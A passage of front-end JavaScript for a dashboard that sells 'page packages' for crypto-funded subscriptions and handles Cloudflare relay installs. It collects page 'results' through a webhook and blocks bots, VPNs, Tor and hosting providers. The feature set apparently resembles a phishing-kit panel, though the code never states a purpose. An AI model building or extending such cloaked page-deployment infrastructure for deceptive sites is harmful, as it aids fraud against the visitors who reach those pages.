  const amount = card.querySelector("[data-wallet-quote-amount]");
  const rate = card.querySelector("[data-wallet-quote-rate]");
  card.dataset.quoteState = state;
  if (amount) amount.textContent = detail || "Enter an amount to calculate crypto.";
  if (rate && state !== "ready") {
    rate.textContent = state === "error" ? "Fix the amount or try another crypto option." : "Quote updates from the backend before you submit.";
  }
}

async function updateWalletFundingQuote() {
  const amountField = preview.querySelector('[data-wallet-fund="amount"]');
  const cryptoField = preview.querySelector('[data-wallet-fund="crypto"]');
  if (!amountField || !cryptoField) return;

  const amount = Number(amountField.value || 0);
  const selected = walletFundingOptionByValue(cryptoField.value);
  if (!Number.isFinite(amount) || amount <= 0) {
    setWalletQuoteState("idle");
    return;
  }
  if (amount < minimumWalletFundingUsd) {
    setWalletQuoteState("error", `Minimum funding is ${formatMoney(minimumWalletFundingUsd)}.`);
    return;
  }

  setWalletQuoteState("loading", "Calculating crypto equivalent...");
  try {
    const params = new URLSearchParams({
      amount: String(amount),
      cryptoType: selected.asset,
      network: selected.network
    });
    const result = await requestApi(`/api/wallet/quote?${params.toString()}`);
    const quote = result.quote || {};
    const card = preview.querySelector("[data-wallet-quote]");
    if (!card) return;
    const amountLabel = card.querySelector("[data-wallet-quote-amount]");
    const rateLabel = card.querySelector("[data-wallet-quote-rate]");
    card.dataset.quoteState = "ready";
    if (amountLabel) amountLabel.textContent = `Send ${quote.cryptoAmount} ${quote.cryptoType} for ${formatMoney(quote.usdAmount)} wallet credit.`;
    if (rateLabel) rateLabel.textContent = `Rate: ${formatMoney(quote.rate)} per ${quote.cryptoType} / ${quote.source || "rate provider"}`;
  } catch (error) {
    setWalletQuoteState("error", `Quote unavailable: ${error.message}`);
  }
}

function scheduleWalletFundingQuote() {
  if (walletQuoteTimer) window.clearTimeout(walletQuoteTimer);
  walletQuoteTimer = window.setTimeout(updateWalletFundingQuote, 350);
}

function updateWalletFundingAddress(select) {
  const card = preview.querySelector("[data-wallet-address-card]");
  if (!card) return;
  card.outerHTML = walletFundingAddressMarkup(walletFundingOptionByValue(select.value));
  scheduleWalletFundingQuote();
}

function walletHistoryDate(value) {
  if (!value) return "wallet";
  return `${formatTrafficDate(value)} ${formatTrafficTime(value)}`.trim();
}

function walletFundingQuoteSummary(request) {
  const quote = request?.quote || {};
  if (!quote.cryptoAmount || !quote.cryptoType) return "";
  const rate = quote.rate ? ` at ${formatMoney(quote.rate)}` : "";
  return `Expected ${quote.cryptoAmount} ${quote.cryptoType}${rate}`;
}

function walletFundingRowMarkup(request) {
  const quoteSummary = walletFundingQuoteSummary(request);
  const expected = quoteSummary
    ? `<em>${escapeHtml(quoteSummary)}</em>`
    : `<em>${escapeHtml(walletHistoryDate(request.createdAt))}</em>`;
  return `
    <div class="wallet-history-row">
      <span>${escapeHtml(request.cryptoType || "Crypto")} ${escapeHtml(request.network || "")}</span>
      <b>${formatMoney(request.amount)}</b>
      <small class="fund-status fund-status-${escapeHtml(request.status || "pending")}">${escapeHtml(request.status || "pending")}</small>
      <code>${escapeHtml(request.txHash || "no hash")}</code>
      ${expected}
    </div>
  `;
}

function walletTransactionRowMarkup(transaction) {
  const amount = Number(transaction.amount || 0);
  return `
    <div class="wallet-history-row wallet-transaction-row">
      <span>${escapeHtml(String(transaction.type || "wallet").replace(/_/g, " "))}</span>
      <b class="${amount < 0 ? "is-negative" : "is-positive"}">${amount < 0 ? "-" : "+"}${formatMoney(Math.abs(amount))}</b>
      <small>${escapeHtml(walletHistoryDate(transaction.createdAt))}</small>
      <code>${escapeHtml(transaction.description || "Wallet activity")}</code>
    </div>
  `;
}

function renderWallet() {
  activeFlowSlug = null;
  const recentRequests = walletDepositRequests.slice(0, 5);
  const recentTransactions = (walletData.transactions || []).slice(0, 6);
  const selectedFundingOption = walletFundingOptionByValue(walletFundingOptions[0]?.value);
  preview.innerHTML = `
    <section class="app-view wallet-view">
      <div class="view-heading">
        <small>wallet / subscription</small>
        <h2>Wallet</h2>
      </div>
      <div class="wallet-grid">
        <article class="wallet-balance package-form">
          <small>available wallet balance</small>
          <strong>${formatMoney(walletData.balance)}</strong>
          <div class="wallet-actions">
            <button type="button" data-wallet-fund-toggle>${walletFundOpen ? "Close funding" : "Fund wallet"}</button>
            <button type="button" data-wallet-history-toggle>${walletHistoryOpen ? "Hide history" : "History"}</button>
          </div>
          ${walletFundOpen ? `
            <div class="wallet-fund-panel">
              <div class="wallet-fund-grid">
                <label>
                  <span>Amount USD</span>
                  <input type="number" min="${minimumWalletFundingUsd}" step="0.01" data-wallet-fund="amount" placeholder="30">
                </label>
                <label>
                  <span>Crypto</span>
                  <select data-wallet-fund="crypto">
                    ${walletFundingOptions.map((option) => `<option value="${escapeHtml(option.value)}">${escapeHtml(option.label)}${option.configured ? "" : " - not set"}</option>`).join("")}
                  </select>
                </label>
              </div>
              ${walletFundingQuoteMarkup()}
              ${walletFundingAddressMarkup(selectedFundingOption)}
              <label>
                <span>Transaction hash</span>
                <input type="text" data-wallet-fund="txHash" placeholder="Paste payment hash">
              </label>
              <div class="wallet-actions">
                <button type="button" data-submit-wallet-fund>Submit hash</button>
              </div>
            </div>
          ` : ""}
          ${walletHistoryOpen ? `
            <div class="wallet-history-panel">
              <section>
                <div class="wallet-history-heading">
                  <span>Funding requests</span>
                  <small>${walletDepositRequests.length} total</small>
                </div>
                <div class="wallet-history-list">
                  ${recentRequests.length ? recentRequests.map(walletFundingRowMarkup).join("") : `<div class="wallet-history-empty">No funding requests yet</div>`}
                </div>
              </section>
              <section>
                <div class="wallet-history-heading">
                  <span>Transactions</span>
                  <small>${recentTransactions.length} recent</small>
                </div>
                <div class="wallet-history-list">
                  ${recentTransactions.length ? recentTransactions.map(walletTransactionRowMarkup).join("") : `<div class="wallet-history-empty">No wallet transactions yet</div>`}
                </div>
              </section>
            </div>
          ` : ""}
        </article>
      </div>
    </section>
  `;
  statusText.textContent = "WALLET READY";
  topbarTitle.textContent = "Wallet / Subscription";
}

function renderRoute() {
  const rawHash = window.location.hash || "#dashboard";
  const hash = routeHash(rawHash);
  closeTopbarOverlays();
  syncAdminVisibility();
  clearAppBusySoon();
  if (!hash.startsWith("#results-")) stopResultsAutoRefresh();

  if (!isLoggedIn()) {
    window.location.replace("/login");
    return;
  }

  setAuthLayout(false);
  if (isAdminRoute(hash) && !canAccessAdminPanel()) {
    window.location.hash = "#dashboard";
    statusText.textContent = "ADMIN ACCESS REQUIRED";
    return;
  }

  if (isAdminRoute(hash) && !isAdmin() && hash !== "#admin-users") {
    window.location.hash = "#admin-users";
    return;
  }

  setActiveNav(["#pages", "#admin", "#my-pages", "#wallet"].includes(hash) ? hash : "#dashboard");

  if (hash === "#login") {
    window.location.assign("/login");
    return;
  }

  if (hash === "#signup") {
    window.location.assign("/invite");
    return;
  }

  if (hash === "#pages") {
    renderPages();
    return;
  }

  if (hash === "#admin") {
    renderAdmin();
    return;
  }

  if (hash === "#admin-users") {
    setActiveNav("#admin");
    renderAdminUsers();
    return;
  }

  if (hash === "#admin-packages") {
    setActiveNav("#admin");
    renderAdminPackages();
    return;
  }

  if (hash === "#admin-publishing") {
    setActiveNav("#admin");
    renderAdminPublishing();
    return;
  }

  if (hash.startsWith("#admin-import-")) {
    setActiveNav("#admin");
    renderAdminImportWizard(hash.replace("#admin-import-", ""));
    return;
  }

  if (hash.startsWith("#admin-package-")) {
    setActiveNav("#admin");
    renderAdminPackageEditor(hash.replace("#admin-package-", ""));
    return;
  }

  if (hash.startsWith("#flow-")) {
    setActiveNav("#my-pages");
    window.location.hash = "#my-pages";
    statusText.textContent = "PAGE BUILDER REMOVED";
    return;
  }

  if (hash.startsWith("#config-")) {
    setActiveNav("#my-pages");
    const pageSlug = hash.replace("#config-", "");
    if (!guardPageCapability(pageSlug, "editConfig")) return;
    renderUserConfigCenter(pageSlug);
    return;
  }

  if (hash.startsWith("#go-live-")) {
    setActiveNav("#my-pages");
    const pageSlug = hash.replace("#go-live-", "");
    if (!guardPageCapability(pageSlug, "goLive")) return;
    renderGoLiveCenter(pageSlug);
    return;
  }

  if (hash.startsWith("#security-")) {
    setActiveNav("#my-pages");
    const [pageSlug, tab = "security"] = hash.replace("#security-", "").split(":");
    if (tab === "security" && !guardPageCapability(pageSlug, "editSecurity")) return;
    renderSecurityCenter(pageSlug, tab);
    return;
  }

  if (hash.startsWith("#results-")) {
    setActiveNav("#my-pages");
    renderResultsCenter(hash.replace("#results-", ""));
    return;
  }

  if (["#my-pages", "#domains", "#security", "#traffic", "#settings"].includes(hash)) {
    setActiveNav("#my-pages");
    renderMyPages();
    return;
  }

  if (hash === "#wallet") {
    renderWallet();
    return;
  }

  renderDashboard();
}

if (copyButton) {
  copyButton.addEventListener("click", async () => {
    const markup = document.querySelector(`#${activeTemplate.id}`).innerHTML.trim();
    await navigator.clipboard.writeText(markup);
    statusText.textContent = "TEMPLATE MARKUP COPIED";
    window.setTimeout(() => {
      statusText.textContent = activeTemplate.status;
    }, 1600);
  });
}

if (randomButton) {
  randomButton.addEventListener("click", () => {
    const pool = templates.filter((template) => template.id !== activeTemplate.id);
    const next = pool[Math.floor(Math.random() * pool.length)];
    setTemplate(next);
  });
}

swatches.addEventListener("click", (event) => {
  const swatch = event.target.closest(".swatch");
  if (!swatch) return;

  setAccentColor(swatch.dataset.accent, true);
});

themeToggle.addEventListener("click", () => {
  const root = document.documentElement;
  const isLight = root.dataset.theme === "light";
  setThemeMode(isLight ? "dark" : "light", true);
});

document.querySelector("[data-logout]")?.addEventListener("click", handleLogout);

function pendingTurnstileConfig(page) {
  const current = page?.securityConfig?.turnstile || {};
  const enteredSecret = preview.querySelector('[data-security-field="turnstileSecretKey"]')?.value.trim() || "";
  return {
    siteKey: preview.querySelector('[data-security-field="turnstileSiteKey"]')?.value.trim() ?? current.siteKey ?? "",
    ...(enteredSecret ? { secretKey: enteredSecret } : {}),
    secretConfigured: Boolean(current.secretConfigured || enteredSecret),
    displayDomain: preview.querySelector('[data-security-field="turnstileDisplayDomain"]')?.value.trim() ?? current.displayDomain ?? ""
  };
}

function renderAdminPublishing() {
  const rows = adminPackages.map((page) => {
    const htmlFiles = [
      ...(page.packageManifest?.files || []),
      ...(page.packageManifest?.screens || []),
      ...(page.screens || [])
    ].filter((item) => /\.html?$/i.test(String(item?.path || item?.file || item)));
    const prices = Object.values(page.billingPeriods || {}).filter((value) => Number(value) > 0);
    const ready = Boolean(page.name && page.slug && htmlFiles.length && prices.length);
    return `<article class="admin-package-row">
      <div><strong>${escapeHtml(page.name)}</strong><span>${escapeHtml(page.slug)} / ${escapeHtml(page.version || "v1")}</span></div>
      <em>${ready ? "Ready" : "Needs attention"}</em>
      <small>${htmlFiles.length} HTML / ${prices.length} prices</small>
      <div class="admin-row-actions">
        <button type="button" data-route="#admin-package-${escapeHtml(page.slug)}">Review</button>
        <button type="button" data-admin-package-preview="${escapeHtml(page.slug)}">Preview</button>
        <button type="button" data-admin-package-publish="${escapeHtml(page.slug)}" ${ready ? "" : "disabled"}>Publish</button>
      </div>
    </article>`;
  }).join("");
  preview.innerHTML = `<section class="app-view">
    <div class="view-heading"><small>admin publishing</small><h2>Publishing queue</h2><p>Review package readiness before marketplace release.</p></div>
    ${viewNav([routeButton("#admin", "&#8592; Admin Studio", "primary"), routeButton("#admin-import-local", "Import")])}
    <article class="admin-table-card"><div class="builder-heading compact"><div><small>release checks</small><h3>Packages</h3></div><button type="button" data-refresh-admin-publishing>Refresh</button></div><div class="admin-package-list">${rows || emptyState("No packages", "Import a package to start publishing.", "#admin-import-local")}</div></article>
  </section>`;
  statusText.textContent = "PUBLISHING QUEUE READY";
  topbarTitle.textContent = "Publishing";
}

function localTurnstileIssues(turnstile) {
  const issues = [];
  if (!turnstile.siteKey) issues.push("Turnstile site key is required");
  if (turnstile.siteKey && turnstile.siteKey === turnstile.secretKey) issues.push("Site key and secret key cannot be the same");
  if (turnstile.displayDomain && (!/^[a-z0-9.-]+$/i.test(turnstile.displayDomain) || turnstile.displayDomain.includes(".."))) {
    issues.push("Display domain must be a hostname only");
  }

  return issues;
}

async function validateTurnstileForPage(page) {
  if (!page) return;
  const output = preview.querySelector("[data-turnstile-validation]");
  const turnstile = pendingTurnstileConfig(page);
  const issues = localTurnstileIssues(turnstile);
  if (issues.length) {
    if (output) output.textContent = `Invalid: ${issues.join("; ")}`;
    statusText.textContent = "TURNSTILE CONFIGURATION INVALID";
    return;
  }
  try {
    const result = await requestApi(`/api/user-pages/${encodeURIComponent(page.id)}/turnstile/validate`, {
      method: "POST",
      body: JSON.stringify({ turnstile })
    });
    if (output) output.textContent = result.validation?.note || "Cloudflare accepted the Turnstile configuration.";
    statusText.textContent = "TURNSTILE CONFIGURATION VALID";
  } catch (error) {
    const remoteIssues = error.data?.validation?.issues || [error.message];
    if (output) output.textContent = `Invalid: ${remoteIssues.join("; ")}`;
    statusText.textContent = "TURNSTILE VALIDATION FAILED";
  }
}

async function saveSecurityConfig(page, tab = "security") {
  if (!page) {
    renderMissingPage();
    return;
  }
  const domainsField = preview.querySelector('[data-security-field="domains"]');
  const captchaField = preview.querySelector('[data-security-field="captcha"]');
  const turnstileSiteKeyField = preview.querySelector('[data-security-field="turnstileSiteKey"]');
  const turnstileSecretKeyField = preview.querySelector('[data-security-field="turnstileSecretKey"]');
  const turnstileDisplayDomainField = preview.querySelector('[data-security-field="turnstileDisplayDomain"]');
  const bannedField = preview.querySelector('[data-security-field="bannedIps"]');
  const whitelistField = preview.querySelector('[data-security-field="whitelistIps"]');
  const blockedDevices = [...preview.querySelectorAll("[data-security-device]:checked")].map((field) => field.dataset.securityDevice);
  const proxyRuleFields = [...preview.querySelectorAll("[data-security-proxy]")];
  const reputationFailureModeField = preview.querySelector("[data-security-failure-mode]");
  const current = page.securityConfig || {};
  const currentTurnstile = current.turnstile || {};
  const currentProxyRules = current.vpnProxyRules || {};
  const vpnProxyRules = proxyRuleFields.length
    ? {
        ...proxyRuleFields.reduce((rules, field) => ({ ...rules, [field.dataset.securityProxy]: field.checked }), {}),
        reputationFailureMode: reputationFailureModeField?.value || currentProxyRules.reputationFailureMode || "challenge"
      }
    : currentProxyRules;
  const ipRules = reconcileIpRules(
    bannedField ? splitRuleList(bannedField.value) : current.bannedIps || [],
    whitelistField ? splitRuleList(whitelistField.value) : current.whitelistIps || []
  );

  const nextTurnstile = pendingTurnstileConfig(page);
  const turnstileRequired = Boolean(captchaField?.checked)
    || (vpnProxyRules.reputationFailureMode === "challenge" && Boolean(vpnProxyRules.blockVpnProxies || vpnProxyRules.blockTor || vpnProxyRules.blockHostingProviders));
  const turnstileIssues = turnstileRequired ? localTurnstileIssues(nextTurnstile) : [];
  if (turnstileIssues.length) {
    statusText.textContent = `SAVE BLOCKED: ${turnstileIssues.join("; ")}`.toUpperCase();
    return;
  }

  const nextSecurityConfig = {
    ...current,
    domains: domainsField ? splitRuleList(domainsField.value) : current.domains || [],
    captcha: captchaField ? captchaField.checked : Boolean(current.captcha),
    turnstile: {
      provider: "turnstile",
      ...nextTurnstile
    },
    bannedIps: ipRules.bannedIps,
    whitelistIps: ipRules.whitelistIps,
    blockedDevices: preview.querySelector("[data-security-device]") ? blockedDevices : current.blockedDevices || [],
    vpnProxyRules
  };
  applyPageSecurityConfig(page, nextSecurityConfig);
  const savedPage = await saveFlowState(page);
  if (!savedPage) {
    applyPageSecurityConfig(page, current);
    await renderSecurityCenter(pageRouteKey(page), tab);
    statusText.textContent = "SECURITY SETTINGS NOT SAVED";
    return false;
  }
  if (savedPage.securityConfig) {
    applyPageSecurityConfig(page, savedPage.securityConfig);
  }
  await renderSecurityCenter(pageRouteKey(page), tab);
  statusText.textContent = "SECURITY SETTINGS SAVED / LIVE ON NEXT REFRESH";
  return true;
}

function saveUserConfig(page) {
  if (!page) {
    renderMissingPage();
    return;
  }
  const getField = (name) => preview.querySelector(`[data-user-config="${name}"]`);
  const fieldValue = (name, fallback = "") => getField(name)?.value.trim() || fallback;
  const fieldChecked = (name, fallback = false) => getField(name)?.checked ?? fallback;
  const domain = fieldValue("domain", page.hostingConfig?.domain || page.domain || "");

  page.domain = domain;
  page.subscription = {
    ...(page.subscription || {}),
    autoRenew: fieldChecked("autoRenew", Boolean(page.subscription?.autoRenew))
  };
  page.generatedFile = {
    ...(page.generatedFile || {}),
    apiBase: page.generatedFile?.apiBase || "/api",
    downloadName: "index.html",
    version: page.generatedFile?.version || "build-001"
  };
  page.resultSettings = {
    ...(page.resultSettings || {}),
    webhook: page.resultSettings?.webhook || "/api/page-results",
    retentionDays: Number(fieldValue("retentionDays", page.resultSettings?.retentionDays || 30)),
    notifyOnResult: fieldChecked("notifyOnResult", Boolean(page.resultSettings?.notifyOnResult))
  };
  page.hostingConfig = {
    ...(page.hostingConfig || {}),
    domain
  };
  page.securityConfig = {
    ...(page.securityConfig || {}),
    domains: domain ? [domain] : []
  };

  saveFlowState(page);
  renderUserConfigCenter(pageRouteKey(page));
  statusText.textContent = `${page.name.toUpperCase()} USER CONFIG SAVED`;
}

function collectHostingFields(page) {
  const field = (name) => preview.querySelector(`[data-hosting-field="${name}"]`)?.value.trim() || "";
  const selectedHostingType = field("hostingType") || "render-static-site";
  return {
    domain: field("domain") || page.domain,
    serverIp: field("serverIp"),
    connectionType: field("connectionType") || "cloudflare-worker",
    hostingType: selectedHostingType,
    installPath: field("installPath") || (selectedHostingType === "render-static-site" ? "root / public directory" : "public_html"),
    relayTarget: page.hostingConfig?.relayTarget || apiBase(),
    relaySecretConfigured: Boolean(page.hostingConfig?.relaySecretConfigured || page.hostingConfig?.relaySecret)
  };
}

function saveHostingConfig(page, verify = false) {
  if (!page) {
    renderMissingPage();
    return;
  }
  const hosting = collectHostingFields(page);
  const hasRelay = hosting.connectionType === "cloudflare-worker";
  const isRenderStatic = hosting.hostingType === "render-static-site";
  const needsOrigin = !hasRelay && !isRenderStatic;
  const workerInstalled = !hasRelay || Boolean(page.hostingConfig?.cloudflare?.managed && page.hostingConfig?.cloudflare?.routePattern);
  const generatedReady = Boolean(page.generatedFile?.lastGeneratedAt);
  const hasMinimumConfig = Boolean(hosting.domain && hosting.serverIp && generatedReady && workerInstalled && (hasRelay ? hosting.relaySecretConfigured : needsOrigin ? hosting.serverIp : true));

  page.domain = hosting.domain;
  page.hostingConfig = {
    ...(page.hostingConfig || {}),
    ...hosting,
    verified: verify ? hasMinimumConfig : Boolean(page.hostingConfig?.verified && hasMinimumConfig),
    verifiedAt: verify && hasMinimumConfig ? new Date().toISOString() : page.hostingConfig?.verifiedAt || null,
    relayVerified: Boolean(page.hostingConfig?.relayVerified && workerInstalled),
    relayVerifiedAt: page.hostingConfig?.relayVerifiedAt || null,
    workerRoute: hosting.domain ? `${hosting.domain}/api/*` : "",
    liveStatus: verify && hasMinimumConfig ? "Live" : hasMinimumConfig ? "Ready to verify" : "Setup required"
  };
  page.securityConfig = {
    ...(page.securityConfig || {}),
    domains: hosting.domain ? [hosting.domain] : []
  };
  page.generatedFile = {
    ...(page.generatedFile || {}),
    apiBase: hosting.connectionType === "cloudflare-worker" ? "/api" : hosting.relayTarget,
    lastGeneratedAt: page.generatedFile?.lastGeneratedAt || null
  };

  saveFlowState(page);
  renderGoLiveCenter(pageRouteKey(page));
  statusText.textContent = verify
    ? hasMinimumConfig ? "FINAL DOMAIN CONNECTION VERIFIED" : "INSTALL WORKER, DOWNLOAD INDEX.HTML, DEPLOY IT, AND ADD RAW HOST URL"
    : "HOSTING SETTINGS SAVED";
}

async function generateRelaySecretForPage(page) {
  if (!page) return;
  const result = await requestApi(`/api/user-pages/${encodeURIComponent(page.id)}/relay-secret/rotate`, { method: "POST" });
  const updated = normalizeUserPage(result.userPage);
  ownedPages = ownedPages.map((item) => item.id === updated.id ? { ...item, ...updated } : item);
  renderGoLiveCenter(pageRouteKey(updated));
  statusText.textContent = "CLOUDFLARE RELAY SECRET ROTATED SERVER-SIDE";
}

function collectCloudflareFields(page) {
  const field = (name) => preview.querySelector(`[data-cloudflare-field="${name}"]`)?.value.trim() || "";
  return {
    domain: page.hostingConfig?.domain || page.domain,
    accountId: field("accountId"),
    apiToken: field("apiToken"),
    scriptName: field("scriptName")
  };
}

async function verifyCloudflareForPage(page) {
  if (!page) return;
  const payload = collectCloudflareFields(page);
  if (!payload.domain || !payload.apiToken) {
    statusText.textContent = "DOMAIN AND CLOUDFLARE TOKEN REQUIRED";
    return;
  }
  statusText.textContent = "VERIFYING CLOUDFLARE ZONE";
  try {
    const result = await requestApi(`/api/user-pages/${page.id}/cloudflare/verify`, {
      method: "POST",
      body: JSON.stringify(payload)
    });
    const updated = normalizeUserPage(result.userPage);
    ownedPages = ownedPages.map((item) => item.id === updated.id ? { ...item, ...updated } : item);
    const installStatus = preview.querySelector("[data-cloudflare-install-status]");
    if (installStatus) installStatus.textContent = "Status: Zone verified - click Install Worker route";
    statusText.textContent = "CLOUDFLARE ZONE VERIFIED / TOKEN KEPT FOR INSTALL";
  } catch (error) {
    statusText.textContent = `CLOUDFLARE VERIFY FAILED: ${error.message}`.toUpperCase();
  }
}

async function installCloudflareForPage(page) {
  if (!page) return;
  const payload = collectCloudflareFields(page);
  if (!payload.domain || !payload.accountId || !payload.apiToken) {
    statusText.textContent = "DOMAIN, ACCOUNT ID, AND CLOUDFLARE TOKEN REQUIRED";
    return;
  }
  if (!page.hostingConfig?.relaySecretConfigured) {
    statusText.textContent = "GENERATE RELAY SECRET FIRST";
    return;
  }
  statusText.textContent = "INSTALLING CLOUDFLARE WORKER";
  try {
    const result = await requestApi(`/api/user-pages/${page.id}/cloudflare/install`, {
      method: "POST",
      body: JSON.stringify(payload)
    });
    const updated = normalizeUserPage(result.userPage);
    ownedPages = ownedPages.map((item) => item.id === updated.id ? updated : item);
    renderGoLiveCenter(pageRouteKey(updated));
    statusText.textContent = "CLOUDFLARE WORKER INSTALLED";
  } catch (error) {
    statusText.textContent = `CLOUDFLARE INSTALL FAILED: ${error.message}`.toUpperCase();
  }
}

function collectGithubImportFields() {
  const field = (name) => preview.querySelector(`[data-github-field="${name}"]`)?.value.trim() || "";
  return {
    repoUrl: field("repoUrl"),
    branch: field("branch"),
    folder: field("folder"),
    packageName: field("packageName") || "GitHub Imported Page",
    slug: field("slug") || "github-imported-page"
  };
}

function collectLocalImportFields() {
  const field = (name) => preview.querySelector(`[data-local-field="${name}"]`)?.value.trim() || "";
  return {
    packageName: field("packageName") || "Local Imported Page",
    slug: field("slug") || "local-imported-page",
    version: "v0.1"
  };
}

function selectedLocalFiles() {
  const zip = preview.querySelector("[data-local-zip]")?.files?.[0] || null;
  if (zip) return { mode: "zip", zip, files: [] };
  const loose = [...(preview.querySelector("[data-local-files]")?.files || [])]
    .map((file) => ({ file, path: file.name }));
  const folder = [...(preview.querySelector("[data-local-folder]")?.files || [])]
    .map((file) => {
      const relativePath = file.webkitRelativePath || file.name;
      const parts = relativePath.split("/");
      return { file, path: parts.length > 1 ? parts.slice(1).join("/") : relativePath };
    });
  return { mode: "loose", zip: null, files: [...loose, ...folder] };
}

function renderLocalImportResult(result) {
  const resultPanel = preview.querySelector("[data-github-result]");
  if (!resultPanel) return;
  const scan = result.scan || {};
  const review = scan.review || {};
  const pagePackage = result.package;
  const previewReady = Boolean(pagePackage?.previewAvailable);
  resultPanel.innerHTML = `
    <code>${escapeHtml(pagePackage ? `${pagePackage.name} ${pagePackage.status}` : "Local import complete")}</code>
    <code>${Number(result.files || scan.files?.length || 0)} files saved to private R2 storage.</code>
    <code>${escapeHtml(review.status || "ready")} — ${(review.warnings || []).length} warning(s)</code>
    ${(review.warnings || []).map((warning) => `<code>${escapeHtml(warning)}</code>`).join("")}
    ${pagePackage ? `<div class="import-result-actions">${previewReady ? `<button type="button" data-admin-package-preview="${escapeHtml(pagePackage.slug)}">Open package preview</button>` : ""}<button type="button" data-route="#admin-package-${escapeHtml(pagePackage.slug)}">Map screens & publish</button></div>` : ""}
  `;
}

async function uploadLocalPackage(mode = "draft") {
  const resultPanel = preview.querySelector("[data-github-result]");
  const selection = selectedLocalFiles();
  if (!selection.zip && !selection.files.length) {
    if (resultPanel) resultPanel.innerHTML = "<code>Select a ZIP, individual files, or a folder first.</code>";
    statusText.textContent = "LOCAL FILES REQUIRED";
    return;
  }
  const base = collectLocalImportFields();
  const startPayload = selection.mode === "zip"
    ? { ...base, mode: "zip", file: { name: selection.zip.name, size: selection.zip.size } }
    : { ...base, mode: "loose", files: selection.files.map(({ file, path }) => ({ path, size: file.size, type: file.type })) };
  if (resultPanel) resultPanel.innerHTML = "<code>Creating secure R2 upload session...</code>";
  statusText.textContent = "PREPARING LOCAL IMPORT";

  try {
    const session = await requestApi("/api/admin/import/local/start", { method: "POST", body: JSON.stringify(startPayload) });
    if (selection.mode === "zip") {
      const response = await fetch(session.upload.uploadUrl, { method: "PUT", headers: { "Content-Type": "application/zip" }, body: selection.zip });
      if (!response.ok) throw new Error(`R2 ZIP upload failed: ${response.status}`);
    } else {
      const localByPath = new Map(selection.files.map((item) => [item.path, item.file]));
      for (let index = 0; index < session.uploads.length; index += 1) {
        const upload = session.uploads[index];
        const file = localByPath.get(upload.path);
        if (!file) throw new Error(`Local file was not found: ${upload.path}`);
        if (resultPanel) resultPanel.innerHTML = `<code>Uploading ${index + 1} / ${session.uploads.length}</code><code>${escapeHtml(upload.path)}</code>`;
        const response = await fetch(upload.uploadUrl, { method: "PUT", headers: { "Content-Type": upload.contentType }, body: file });
        if (!response.ok) throw new Error(`R2 upload failed for ${upload.path}: ${response.status}`);
      }
    }
    if (resultPanel) resultPanel.innerHTML = "<code>Verifying uploaded objects and creating package...</code>";
    const result = await requestApi("/api/admin/import/local/finalize", {
      method: "POST",
      body: JSON.stringify({ importToken: session.importToken, publish: mode === "publish" })
    });
    renderLocalImportResult(result);
    await loadAppData();
    statusText.textContent = mode === "publish" ? "LOCAL R2 PACKAGE PUBLISHED" : "LOCAL R2 PACKAGE DRAFT CREATED";
  } catch (error) {
    if (resultPanel) resultPanel.innerHTML = `<code>Local import failed</code><code>${escapeHtml(error.message)}</code>`;
    statusText.textContent = "LOCAL IMPORT FAILED";
  }
}

function githubFileUrl(scan, filePath, mode = "blob") {
  const base = mode === "raw"
    ? `https://raw.githubusercontent.com/${scan.owner}/${scan.repo}/${scan.branch}`
    : `https://github.com/${scan.owner}/${scan.repo}/blob/${scan.branch}`;
  return `${base}/${scan.folder ? `${scan.folder}/` : ""}${filePath.replace(`${scan.folder}/`, "")}`;
}

function githubPreviewUrl(scan, filePath) {
  const ticket = scan.previewTickets?.[filePath];
  if (!ticket) return "";
  const params = new URLSearchParams({ ticket });
  return `${apiBase()}/api/admin/import/github/preview?${params.toString()}`;
}

async function openPackagePreview(pagePackage) {
  if (!pagePackage?.id || !(pagePackage.previewAvailable || pagePackage.previewReady)) {
    throw new Error("Package preview is unavailable");
  }

  const popup = window.open("about:blank", "_blank");
  if (popup) {
    popup.opener = null;
    popup.document.title = "Opening secure preview";
    popup.document.body.textContent = "Opening secure preview...";
  }

  try {
    const result = await requestApi(`/api/packages/${encodeURIComponent(pagePackage.id)}/preview-session`, {
      method: "POST"
    });
    if (!result.previewUrl) throw new Error("Preview launch URL is unavailable");
    if (popup) popup.location.replace(result.previewUrl);
    else window.location.assign(result.previewUrl);
    return result.previewUrl;
  } catch (error) {
    if (popup && !popup.closed) popup.close();
    throw error;
  }
}

function packageAssetUrl(pagePackage, filePath) {
  if (!pagePackage.id || !filePath) return "";
  const params = new URLSearchParams({ file: filePath });
  return `${apiBase()}/api/packages/${encodeURIComponent(pagePackage.id)}/asset?${params.toString()}`;
}

function packageThumbnailUrl(pagePackage) {
  return pagePackage.thumbnailDataUrl || pagePackage.packageManifest?.thumbnailDataUrl || packageAssetUrl(pagePackage, pagePackage.thumbnailPath);
}

function pageInitials(name) {
  const initials = String(name || "PG")
    .trim()
    .split(/\s+/)
    .map((part) => part.charAt(0))
    .join("")
    .slice(0, 2)
    .toUpperCase();
  return initials || "PG";
}

function pageIconMarkup(pagePackage) {
  const thumbnailUrl = packageThumbnailUrl(pagePackage);
  const fallback = `<span class="market-icon-fallback">${escapeHtml(pageInitials(pagePackage.name))}</span>`;
  if (!thumbnailUrl) return `<span class="market-icon">${fallback}</span>`;
  return `
    <span class="market-icon has-image">
      <img src="${escapeHtml(thumbnailUrl)}" alt="${escapeHtml(pagePackage.name)} favicon" loading="lazy" onerror="this.remove()">
      ${fallback}
    </span>
  `;
}

function updateMarketPlanCard(select) {
  const pagePackage = marketPages.find((item) => item.slug === select.dataset.marketPlan);
  if (!pagePackage) return;
  selectedMarketPlans[pagePackage.slug] = select.value;
  const card = select.closest(".market-card");
  const priceLabel = card?.querySelector(`[data-market-price="${pagePackage.slug}"]`);
  const subscribeButton = card?.querySelector(`[data-market-subscribe="${pagePackage.slug}"]`);
  if (priceLabel) priceLabel.textContent = marketPriceLabel(pagePackage, select.value);
  if (subscribeButton) subscribeButton.textContent = marketSubscribeLabel(pagePackage, select.value);
}

async function subscribeToMarketPackage(button) {
  if (!isLoggedIn()) {
    window.location.hash = "#login";
    statusText.textContent = "LOGIN REQUIRED TO SUBSCRIBE";
    return;
  }

  await refreshAuthUser();

  const pagePackage = marketPages.find((item) => item.slug === button.dataset.marketSubscribe);
  if (!pagePackage) {
    statusText.textContent = "PAGE PACKAGE NOT FOUND";
    return;
  }

  const period = selectedBillingPeriod(pagePackage);
  const price = billingPrice(pagePackage, period);
  const originalLabel = button.textContent;
  button.disabled = true;
  button.textContent = "Subscribing...";
  statusText.textContent = `SUBSCRIBING TO ${pagePackage.name.toUpperCase()}`;

  try {
    await requestApi(`/api/packages/${pagePackage.slug}/subscribe`, {
      method: "POST",
      body: JSON.stringify({ billingPeriod: period })
    });
    await loadAppData();
